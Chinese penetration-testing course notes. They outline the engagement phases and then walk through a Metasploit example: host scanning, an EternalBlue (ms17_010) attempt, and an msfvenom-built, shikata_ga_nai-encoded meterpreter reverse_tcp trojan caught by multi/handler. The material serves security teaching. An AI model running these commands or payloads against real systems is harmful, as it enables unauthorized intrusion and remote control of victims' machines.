# 一、阶段划分：

漏洞利用分为 前期交互   情报搜集 威胁建模  漏洞分析  .渗透利用  后渗透利用 报告 这几个阶段

## 1.前期交互阶段：

与客户组织进行交互讨论，确定范围，目标等

​这个阶段大家可以理解为情报收集前阶段，主要是为了找到目标 确认范围

![[1643165117094.png]]

## 2.情报搜集阶段：

获取更多目标组织信息，

外围信息搜索   -    Google

![[1643165139006.png]]

​          主机探测与端口扫描         如 -Nmap

​           服务扫描       利用metasploit中的auxiliary/scanner/中的服务扫描模块，可以对靶机中的服务版本等信息进行扫描

​            网络漏洞扫描   -OpenVAS、Nessus等

​             其他工具扫描  py脚本扫描

## 3.威胁建模阶段：

理清头绪，确定出最可行的漏洞利用通道，这个建模阶段写的文档不是给自己看的 是给整个团队看的 方便多人合作

![[1643165166875.png]]

​这个阶段主要是根据收集到的情报进行整理 ，理清漏洞利用思路。

## 4.漏洞分析阶段：

搜索可获取的渗透代码资源

![[1643165182827.png]]

​           这个阶段主要 挑选匹配可能存在的漏洞利用模块，shellcode

## 5.渗透利用阶段：

找出安全漏洞，入侵系统

​          这个阶段尝试利用漏洞 ，配置监控，开始漏洞利用

## 6.后渗透利用阶段：

Meterpreter，实施操作

​            这个阶段 就开始实施相关数据下载 后门维持  提权等操作

## 7.报告阶段：

漏洞利用渗透测试报告  （详细报告编写看 渗透测试报告课程）

![[1643165204135.png]]

这个阶段主要是对本次渗透进行总结，概述总体上包括 时间、人员、漏洞利用范围、技术手段等等。我们需要在这部分确定漏洞利用执行的时间范围、参与漏洞利用的人员及联系方式、约定的漏洞利用范围和一些漏洞利用过程中采用的技术、工具描述。写清  前期交互   情报搜集 威胁建模  漏洞分析  .渗透利用  后渗透利用  漏洞利用结果 安全建议 等内容

在撰写的过程中，需要特别注意的是：漏洞描述切忌不可过于简单，一笔带过；在安全建议部分避免提出没有实际意义的安全建议，比如加强安全意识；报告结构混乱不堪，太多复杂的专业术语，比如绕狗、x站等等；

# 二、实际操作（举例）

主机范围和目标已确定

1 情报搜集

基于msf发现内网存活主机
search 搜索
msf终端内输入 search scanner type:auxiliary
可用于发现主机的模块

auxiliary/scanner/discovery/arp_sweep # 基于ARP发现内网存活主机

auxiliary/scanner/discovery/udp_sweep # 基于UDP发现内网存活主机

auxiliary/scanner/ftp/ftp_version # 发现FTP服务

auxiliary/scanner/http/http_version # 发现HTTP服务

auxiliary/scanner/smb/smb_version # 基于smb发现内网存活主机

基于netbios发现内网存活主机

基于snmap发现内网存活主机

基于ICMP发现内网存活主机

2  威胁建模
经过第一步情报收集 我们通过 arp 发现了 目标机器 ip

然后通过对目标机器的 ip 扫描  我们知道了  目标机器开通了 80端口  有web服务  开了 ftp 端口  有文件服务

开了 smb

最终决定对smb相关的漏洞进行利用

备选方案通过植入木马的方式进行利用

---

3   漏洞分析

第一步先查看smb利用漏洞有哪些  比如永恒之蓝

1 查询msf与永恒之蓝相关的 模块

使用命令    search ms17_010

2 然后我们利用了一个永恒之蓝的 扫描模块

use auxiliary/scanner/smb/smb_ms17_010

3  输入  options  查看扫描模块需要配置的参数

3.1 然后我们配置了rhost  （rhost指的是目标主机ip）

set rhost   ip

4 然后我们执行扫描 输入  run

发现了 可能存在漏洞的主机

4  渗透利用

---

1 加载 永恒之蓝漏洞利用模块

use exploit/windows/smb/ms17_010_eternalblue

2  输入  options  查看扫描模块需要配置的参数

3.1 然后我们配置了rhost  （rhost指的是目标主机ip）

set rhost   ip

3.2 然后我们配置了  lhost （lhost指的是  监控主机或攻击机 ip）

set lhost   ip

3.3 然后我们配置了 lport  （指的是监控的端口 ）

set lport   ip

注意端口必须没有被占用

4 然后我们执行扫描 输入  run 执行永恒之蓝漏洞利用

但是发现失败  提示 模块已经利用了  但是没有返回对应 session

![[bffdb79061ad4b0aa92d2dfde83e9f1b.png]]

5  备选方案通过植入木马的方式进行利用

---

1  我们知道目标机器是win系统  所以使用msfvenom  生成一个win平台的木马

msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp

LHOST=192.168.3.33 LPORT=4446 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 10  -f exe -o payload.
2 漏洞生成后  通过启动一个py服务将木马上传到目标机器

python -m SimpleHTTPServer 80

3 配置监控程序我们使用了

use exploit/multi/handler

3 输入 options进入配置

3.1 然后我们配置了  lhost （lhost指的是  监控主机或攻击机 ip）

set lhost   ip

3.2然后我们配置了 lport  （指的是监控的端口 ）

set lport  

注意端口必须和msfvenom 生成的木马端口一样才行

4 配置攻击载荷 payload

set payload windows/meterpreter/reverse_tcp

5 执行利用等待目标机器执行木马

6 目标机器执行了木马

利用成功并获得 meterpreter

5  后渗透利用

6  报告阶段